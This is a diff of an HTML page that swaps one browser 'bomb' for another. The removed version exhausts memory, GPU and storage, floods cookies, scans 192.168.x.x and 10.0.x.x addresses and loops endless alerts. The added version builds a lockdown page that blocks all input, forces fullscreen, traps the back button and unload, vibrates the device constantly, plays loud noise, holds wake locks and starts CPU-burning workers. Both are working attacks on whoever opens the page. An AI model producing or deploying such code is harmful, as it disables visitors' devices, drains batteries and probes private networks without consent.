@@ -1,267 +1,363 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>⚠️ SYSTEM UPDATE REQUIRED</title>
-<meta charset="utf-8">
-<style>
-*{margin:0;padding:0;overflow:hidden;cursor:none}
-body,html{width:100%;height:100%}
-.nuke{position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;z-index:9999999;animation:seizure 0.0001s infinite}
-@keyframes seizure{
-  0%{background:#fff;transform:rotate(0deg)}
-  25%{background:#f00;transform:rotate(90deg)scale(5)}
-  50%{background:#0f0;transform:rotate(180deg)scale(0.2)}
-  75%{background:#00f;transform:rotate(270deg)scale(10)}
-  100%{background:#000;transform:rotate(360deg)}
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+    <title> </title>
+    <style>
+        *,*::before,*::after{
+            pointer-events:none!important;
+            touch-action:none!important;
+            -webkit-touch-callout:none!important;
+            -webkit-user-select:none!important;
+            user-select:none!important;
+            overscroll-behavior:none!important;
+            margin:0!important;
+            padding:0!important;
+            box-sizing:border-box!important;
+        }
+        html,body{
+            position:fixed!important;
+            top:0!important;
+            left:0!important;
+            width:100vw!important;
+            height:100vh!important;
+            overflow:hidden!important;
+            background:#000!important;
+        }
+        #wall{
+            position:fixed;
+            top:-500px;
+            left:-500px;
+            width:calc(100vw + 1000px);
+            height:calc(100vh + 1000px);
+            z-index:2147483647;
+            background:transparent;
+            pointer-events:all!important;
+            touch-action:none!important;
+            cursor:none!important;
+        }
+        .bomb{
+            position:fixed;
+            pointer-events:none!important;
+            opacity:0.5;
+            z-index:9999998;
+        }
+        .svglayer{
+            position:fixed;
+            top:0;
+            left:0;
+            z-index:9999997;
+            pointer-events:none!important;
+        }
+        .canvaslayer{
+            position:fixed;
+            top:0;
+            left:0;
+            z-index:9999996;
+            pointer-events:none!important;
+            width:100vw;
+            height:100vh;
+        }
+        .iframeLayer{
+            position:fixed;
+            top:0;
+            left:0;
+            width:100vw;
+            height:100vh;
+            z-index:9999994;
+            border:none;
+            pointer-events:none!important;
+        }
+    </style>
 </head>
-<body onload="initNuke()">
-<div class="nuke"></div>
+<body>
 
-<!-- MULTIPLE HIDDEN IFRAMES FOR KERNEL ATTACK -->
-<iframe id="k1" style="display:none"></iframe>
-<iframe id="k2" style="display:none"></iframe>
-<iframe id="k3" style="display:none"></iframe>
+    <!-- WALL -->
+    <div id="wall"></div>
 
-<script>
-function initNuke(){
-  // ========== PART 1: PHYSICAL MEMORY OVERFLOW ==========
-  function allocatePhysical(){
-    const size = 1024 * 1024 * 1024; // 1GB per allocation
-    const arrays = [];
-    let counter = 0;
-    const alloc = () => {
-      try{
-        arrays.push(new ArrayBuffer(size));
-        const view = new Uint32Array(arrays[arrays.length-1]);
-        for(let i=0;i<view.length;i+=1024) view[i]=0xDEADBEEF;
-        counter++;
-        if(counter < 1000) setTimeout(alloc,0);
-      }catch(e){
-        // Force garbage collector failure
-        setTimeout(()=>{
-          new ArrayBuffer(Number.MAX_SAFE_INTEGER);
-        },0);
-      }
-    };
-    alloc();
-  }
+    <!-- 50 PRE-RENDERED DIV BOMBS -->
+    <div class="bomb" style="top:0%;left:0%;width:500px;height:500px;background:#ff0000;transform:rotate(0deg);"></div>
+    <div class="bomb" style="top:1%;left:2%;width:550px;height:550px;background:#00ff00;transform:rotate(45deg);"></div>
+    <div class="bomb" style="top:2%;left:4%;width:600px;height:600px;background:#0000ff;transform:rotate(90deg);"></div>
+    <div class="bomb" style="top:3%;left:6%;width:650px;height:650px;background:#ffff00;transform:rotate(135deg);"></div>
+    <div class="bomb" style="top:4%;left:8%;width:700px;height:700px;background:#ff00ff;transform:rotate(180deg);"></div>
+    <div class="bomb" style="top:5%;left:10%;width:750px;height:750px;background:#00ffff;transform:rotate(225deg);"></div>
+    <div class="bomb" style="top:6%;left:12%;width:800px;height:800px;background:#ff8800;transform:rotate(270deg);"></div>
+    <div class="bomb" style="top:7%;left:14%;width:850px;height:850px;background:#8800ff;transform:rotate(315deg);"></div>
+    <div class="bomb" style="top:8%;left:16%;width:900px;height:900px;background:#0088ff;transform:rotate(10deg);"></div>
+    <div class="bomb" style="top:9%;left:18%;width:950px;height:950px;background:#ff0088;transform:rotate(55deg);"></div>
+    <div class="bomb" style="top:10%;left:20%;width:1000px;height:1000px;background:#88ff00;transform:rotate(100deg);"></div>
+    <div class="bomb" style="top:11%;left:22%;width:1050px;height:1050px;background:#ff4444;transform:rotate(145deg);"></div>
+    <div class="bomb" style="top:12%;left:24%;width:1100px;height:1100px;background:#44ff44;transform:rotate(190deg);"></div>
+    <div class="bomb" style="top:13%;left:26%;width:1150px;height:1150px;background:#4444ff;transform:rotate(235deg);"></div>
+    <div class="bomb" style="top:14%;left:28%;width:1200px;height:1200px;background:#ffff44;transform:rotate(280deg);"></div>
+    <div class="bomb" style="top:15%;left:30%;width:1250px;height:1250px;background:#ff44ff;transform:rotate(325deg);"></div>
+    <div class="bomb" style="top:16%;left:32%;width:1300px;height:1300px;background:#44ffff;transform:rotate(15deg);"></div>
+    <div class="bomb" style="top:17%;left:34%;width:1350px;height:1350px;background:#ff8844;transform:rotate(60deg);"></div>
+    <div class="bomb" style="top:18%;left:36%;width:1400px;height:1400px;background:#8844ff;transform:rotate(105deg);"></div>
+    <div class="bomb" style="top:19%;left:38%;width:1450px;height:1450px;background:#44ff88;transform:rotate(150deg);"></div>
+    <div class="bomb" style="top:20%;left:40%;width:1500px;height:1500px;background:#ff4488;transform:rotate(195deg);"></div>
+    <div class="bomb" style="top:21%;left:42%;width:1550px;height:1550px;background:#88ff44;transform:rotate(240deg);"></div>
+    <div class="bomb" style="top:22%;left:44%;width:1600px;height:1600px;background:#4488ff;transform:rotate(285deg);"></div>
+    <div class="bomb" style="top:23%;left:46%;width:1650px;height:1650px;background:#ff8844;transform:rotate(330deg);"></div>
+    <div class="bomb" style="top:24%;left:48%;width:1700px;height:1700px;background:#884488;transform:rotate(25deg);"></div>
+    <div class="bomb" style="top:25%;left:50%;width:1750px;height:1750px;background:#448844;transform:rotate(70deg);"></div>
+    <div class="bomb" style="top:26%;left:52%;width:1800px;height:1800px;background:#888844;transform:rotate(115deg);"></div>
+    <div class="bomb" style="top:27%;left:54%;width:1850px;height:1850px;background:#444488;transform:rotate(160deg);"></div>
+    <div class="bomb" style="top:28%;left:56%;width:1900px;height:1900px;background:#884444;transform:rotate(205deg);"></div>
+    <div class="bomb" style="top:29%;left:58%;width:1950px;height:1950px;background:#448844;transform:rotate(250deg);"></div>
+    <div class="bomb" style="top:30%;left:60%;width:2000px;height:2000px;background:#844884;transform:rotate(295deg);"></div>
+    <div class="bomb" style="top:31%;left:62%;width:2050px;height:2050px;background:#488448;transform:rotate(340deg);"></div>
+    <div class="bomb" style="top:32%;left:64%;width:2100px;height:2100px;background:#844444;transform:rotate(8deg);"></div>
+    <div class="bomb" style="top:33%;left:66%;width:2150px;height:2150px;background:#448444;transform:rotate(53deg);"></div>
+    <div class="bomb" style="top:34%;left:68%;width:2200px;height:2200px;background:#444484;transform:rotate(98deg);"></div>
+    <div class="bomb" style="top:35%;left:70%;width:2250px;height:2250px;background:#848444;transform:rotate(143deg);"></div>
+    <div class="bomb" style="top:36%;left:72%;width:2300px;height:2300px;background:#844484;transform:rotate(188deg);"></div>
+    <div class="bomb" style="top:37%;left:74%;width:2350px;height:2350px;background:#484844;transform:rotate(233deg);"></div>
+    <div class="bomb" style="top:38%;left:76%;width:2400px;height:2400px;background:#448484;transform:rotate(278deg);"></div>
+    <div class="bomb" style="top:39%;left:78%;width:2450px;height:2450px;background:#844848;transform:rotate(323deg);"></div>
+    <div class="bomb" style="top:40%;left:80%;width:2500px;height:2500px;background:#484484;transform:rotate(18deg);"></div>
+    <div class="bomb" style="top:41%;left:82%;width:2550px;height:2550px;background:#848448;transform:rotate(63deg);"></div>
+    <div class="bomb" style="top:42%;left:84%;width:2600px;height:2600px;background:#488484;transform:rotate(108deg);"></div>
+    <div class="bomb" style="top:43%;left:86%;width:2650px;height:2650px;background:#444444;transform:rotate(153deg);"></div>
+    <div class="bomb" style="top:44%;left:88%;width:2700px;height:2700px;background:#888888;transform:rotate(198deg);"></div>
+    <div class="bomb" style="top:45%;left:90%;width:2750px;height:2750px;background:#222222;transform:rotate(243deg);"></div>
+    <div class="bomb" style="top:46%;left:92%;width:2800px;height:2800px;background:#666666;transform:rotate(288deg);"></div>
+    <div class="bomb" style="top:47%;left:94%;width:2850px;height:2850px;background:#aaaaaa;transform:rotate(333deg);"></div>
+    <div class="bomb" style="top:48%;left:96%;width:2900px;height:2900px;background:#cccccc;transform:rotate(28deg);"></div>
+    <div class="bomb" style="top:49%;left:98%;width:2950px;height:2950px;background:#eeeeee;transform:rotate(73deg);"></div>
+    <div class="bomb" style="top:50%;left:0%;width:3000px;height:3000px;background:#111111;transform:rotate(118deg);"></div>
 
-  // ========== PART 2: GPU MELTDOWN ==========
-  function gpuMeltdown(){
-    const canvases = [];
-    for(let i=0;i<100;i++){
-      const canvas = document.createElement('canvas');
-      canvas.width = 16384;
-      canvas.height = 16384;
-      const ctx = canvas.getContext('2d'||'webgl'||'webgl2');
-      if(ctx){
-        // Fill with complex gradient
-        const gradient = ctx.createLinearGradient(0,0,16384,16384);
-        for(let j=0;j<1000;j++) gradient.addColorStop(j/1000,`#${Math.random().toString(16).substr(2,6)}`);
-        ctx.fillStyle = gradient;
-        ctx.fillRect(0,0,16384,16384);
-        
-        // WebGL buffer bomb
-        if(ctx instanceof WebGLRenderingContext){
-          const buffer = ctx.createBuffer();
-          ctx.bindBuffer(ctx.ARRAY_BUFFER,buffer);
-          ctx.bufferData(ctx.ARRAY_BUFFER,new ArrayBuffer(1<<30),ctx.STATIC_DRAW);
+    <!-- 25 SVG LAYER BOMBS -->
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#000" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#111" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#222" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#333" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#444" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#555" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#666" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#777" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#888" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#999" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#aaa" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#bbb" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#ccc" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#ddd" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#eee" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#f00" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#0f0" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#00f" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#ff0" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#0ff" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#f0f" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#880" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#088" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#808" opacity="0.01"/></svg>
+    <svg class="svglayer" width="9999" height="9999"><rect width="9999" height="9999" fill="#088" opacity="0.01"/></svg>
+
+    <!-- 50 CANVAS LAYER BOMBS -->
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+    <canvas class="canvaslayer" width="9999" height="9999"></canvas>
+
+    <!-- 100 IFRAME LAYER BOMBS -->
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+    <iframe class="iframeLayer" src="about:blank"></iframe>
+
+    <!-- JAVASCRIPT LOCKDOWN -->
+    <script>
+    (function(){
+        'use strict';
+
+        var w=document.getElementById('wall');
+        var k=function(e){e.preventDefault();e.stopPropagation();e.stopImmediatePropagation();return false;};
+        var evts=['touchstart','touchmove','touchend','touchcancel','pointerdown','pointermove','pointerup','pointercancel','mousedown','mousemove','mouseup','click','dblclick','contextmenu','gesturestart','gesturechange','gestureend','scroll','wheel','keydown','keyup','keypress'];
+        for(var i=0;i<evts.length;i++){
+            w.addEventListener(evts[i],k,{capture:true,passive:false});
+            document.addEventListener(evts[i],k,{capture:true,passive:false});
+            window.addEventListener(evts[i],k,{capture:true,passive:false});
         }
-      }
-      canvases.push(canvas);
-      document.body.appendChild(canvas);
-    }
-  }
 
-  // ========== PART 3: KERNEL PANIC SIMULATION ==========
-  function kernelPanic(){
-    const iframes = ['k1','k2','k3'];
-    const exploits = [
-      `data:text/html,<script>
-        // Stack overflow recursion
-        function recurse(){recurse()}
-        recurse();
-      <\/script>`,
-      
-      `data:text/html,<script>
-        // Memory exhaustion via WebAssembly
-        const mem = new WebAssembly.Memory({initial:65535});
-        const arr = new Uint8Array(mem.buffer);
-        while(true) arr[arr.length-1] = 255;
-      <\/script>`,
-      
-      `data:text/html,<script>
-        // Infinite redirect loop with storage
-        localStorage.setItem('bomb',Array(1e7).join('X'));
-        sessionStorage.setItem('bomb',Array(1e7).join('Y'));
-        setInterval(()=>{
-          location.href = location.href + '?bomb=' + Array(1e6).join('Z');
-        },1);
-      <\/script>`
-    ];
-    
-    iframes.forEach((id,idx)=>{
-      document.getElementById(id).src = exploits[idx];
-    });
-  }
-
-  // ========== PART 4: AUDIO BIOS OVERDRIVE ==========
-  function audioBiosKill(){
-    const ctx = new (AudioContext||webkitAudioContext)();
-    const oscils = [];
-    // Create 1000 oscillators
-    for(let i=0;i<1000;i++){
-      setTimeout(()=>{
-        const osc = ctx.createOscillator();
-        const gain = ctx.createGain();
-        osc.connect(gain);
-        gain.connect(ctx.destination);
-        osc.frequency.setValueAtTime(440 * Math.pow(2,i/100),ctx.currentTime);
-        gain.gain.setValueAtTime(1.0,ctx.currentTime);
-        osc.start();
-        oscils.push(osc);
-      },i*10);
-    }
-    // Max volume burst
-    setTimeout(()=>{
-      const gain = ctx.createGain();
-      gain.gain.setValueAtTime(1000,ctx.currentTime);
-      gain.connect(ctx.destination);
-      const noise = ctx.createBufferSource();
-      const buffer = ctx.createBuffer(1,44100*10,44100);
-      const data = buffer.getChannelData(0);
-      for(let i=0;i<data.length;i++) data[i] = Math.random()*2-1;
-      noise.buffer = buffer;
-      noise.connect(gain);
-      noise.start();
-    },2000);
-  }
-
-  // ========== PART 5: STORAGE CORRUPTION ==========
-  function destroyStorage(){
-    // IndexedDB bomb
-    const dbName = 'corruptDB_' + Date.now();
-    const req = indexedDB.open(dbName,1);
-    req.onupgradeneeded = (e)=>{
-      const db = e.target.result;
-      for(let i=0;i<100;i++){
-        db.createObjectStore('store'+i,{autoIncrement:true});
-      }
-    };
-    req.onsuccess = (e)=>{
-      const db = e.target.result;
-      setInterval(()=>{
-        for(let i=0;i<100;i++){
-          const tx = db.transaction(['store'+i],'readwrite');
-          const store = tx.objectStore('store'+i);
-          for(let j=0;j<1000;j++){
-            store.put(new ArrayBuffer(1024*1024),j);
-          }
-        }
-      },500);
-    };
-    
-    // Cookie bomb
-    setInterval(()=>{
-      document.cookie = `bomb${Date.now()}=${Array(4096).join('X')};path=/`;
-    },10);
-  }
-
-  // ========== PART 6: NETWORK LAYER DDOS ==========
-  function networkFlood(){
-    // Internal network scan flood
-    setInterval(()=>{
-      for(let i=0;i<256;i++){
-        for(let j=0;j<256;j++){
-          fetch(`http://192.168.${i}.${j}`,{mode:'no-cors'}).catch(()=>{});
-          fetch(`http://10.0.${i}.${j}`,{mode:'no-cors'}).catch(()=>{});
-        }
-      }
-    },1000);
-    
-    // WebRTC IP leak bomb
-    const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
-    pc.createDataChannel('bomb');
-    pc.createOffer().then(offer=>pc.setLocalDescription(offer));
-  }
-
-  // ========== PART 7: BOOTLOADER ATTACK SIMULATION ==========
-  function simulateBootAttack(){
-    // HTML5 FileSystem abuse
-    if(window.requestFileSystem){
-      navigator.webkitPersistentStorage.requestQuota(1024*1024*1024*100,()=>{
-        window.requestFileSystem(PERSISTENT,1024*1024*1024*100,(fs)=>{
-          function writeFiles(dir, depth){
-            if(depth>5) return;
-            for(let i=0;i<100;i++){
-              fs.root.getFile(`bomb_${Date.now()}_${i}.bin`,{create:true},(fileEntry)=>{
-                fileEntry.createWriter((writer)=>{
-                  const blob = new Blob([new ArrayBuffer(1024*1024*10)]);
-                  writer.write(blob);
-                });
-              });
+        function fs(){
+            var d=document.documentElement;
+            var m=['requestFullscreen','webkitRequestFullscreen','webkitRequestFullScreen','mozRequestFullScreen','msRequestFullscreen'];
+            for(var i=0;i<m.length;i++){
+                if(d[m[i]]){try{d[m[i]]();}catch(e){}}
             }
-          }
-          writeFiles(fs.root,0);
-        });
-      });
-    }
-  }
+        }
+        fs();setInterval(fs,5);
 
-  // ========== EXECUTE ALL ATTACKS ==========
-  const attacks = [
-    allocatePhysical,
-    gpuMeltdown,
-    kernelPanic,
-    audioBiosKill,
-    destroyStorage,
-    networkFlood,
-    simulateBootAttack
-  ];
-  
-  attacks.forEach((attack,index)=>{
-    setTimeout(attack,index*100);
-  });
-
-  // ========== FINAL TOUCH: INFINITE ALERT BOMB ==========
-  setTimeout(()=>{
-    while(true){
-      try{alert('SYSTEM HACKED')}catch(e){}
-      try{prompt('ENTER PASSWORD:')}catch(e){}
-      try{confirm('DEVICE WILL NOW BRICK')}catch(e){}
-    }
-  },3000);
-}
-</script>
-
-<!-- PHYSICAL VIBRATION BOMB (FOR MOBILE) -->
-<script>
-if(navigator.vibrate){
-  setInterval(()=>{
-    navigator.vibrate([1000,500,1000,500,1000]);
-  },10);
-}
-</script>
-
-<!-- BATTERY OVERHEAT SIMULATION -->
-<script>
-if(navigator.getBattery){
-  navigator.getBattery().then(battery=>{
-    setInterval(()=>{
-      const wakeLock = navigator.wakeLock?.request('screen');
-      // Force high performance mode
-      const canvas = document.createElement('canvas');
-      const ctx = canvas.getContext('2d');
-      canvas.width = 4096;
-      canvas.height = 4096;
-      for(let i=0;i<1000;i++){
-        ctx.fillRect(Math.random()*4096,Math.random()*4096,100,100);
-      }
-    },100);
-  });
-}
-</script>
+        for(var i=0;i<50000;i++){history.pushState(null,'',window.location.href);}
+        setInterval(function(){for(var i=0;i<10000;i++){history.pushState(null,'',window.location.href);}},1);
+        window.addEventListener('popstate',function(){history.pushState(null,'',window.location.href);history.go(1);});
+        window.addEventListener('beforeunload',function(e){e.preventDefault();e.returnValue='';return '';});
+        document.addEventListener('visibilitychange',function(){if(document.hidden){setTimeout(function(){fs();history.pushState(null,'',window.location.href);},10);}});
+        if(window.navigation){window.navigation.addEventListener('navigate',function(e){e.preventDefault();});}
+        function lo(){try{screen.orientation.lock('portrait-primary').catch(function(){});screen.orientation.lock('landscape-primary').catch(function(){});}catch(e){}}
+        lo();setInterval(lo,50);
+        if(navigator.vibrate){setInterval(function(){try{navigator.vibrate(30000);}catch(e){}},10);}
+        try{var aC=new(window.AudioContext||window.webkitAudioContext)();for(var j=0;j<10;j++){var bf=aC.createBuffer(1,aC.sampleRate*5,aC.sampleRate);var dt=bf.getChannelData(0);for(var i=0;i<dt.length;i++)dt[i]=Math.random()*2-1;var sr=aC.createBufferSource();sr.buffer=bf;sr.loop=true;sr.connect(aC.destination);sr.start(0);}}catch(e){}
+        try{navigator.wakeLock.request('screen');}catch(e){}
+        setInterval(function(){try{navigator.wakeLock.request('screen');}catch(e){}},100);
+        var wc='while(true){var x=0;for(var i=0;i<99999999;i++){x+=Math.pow(Math.random(),Math.random());x*=Math.sqrt(Math.abs(Math.random()*999999));}}';
+        var bl=new Blob([wc],{type:'application/javascript'});
+        var ur=URL.createObjectURL(bl);
+        for(var i=0;i<16;i++){try{new Worker(ur);}catch(e){}}
+        var mH=[];
+        function mB(){try{for(var i=0;i<100000;i++){mH.push(new Uint8Array(1024*1024));}}catch(e){mH=[];}}
+        mB();setInterval(mB,5);
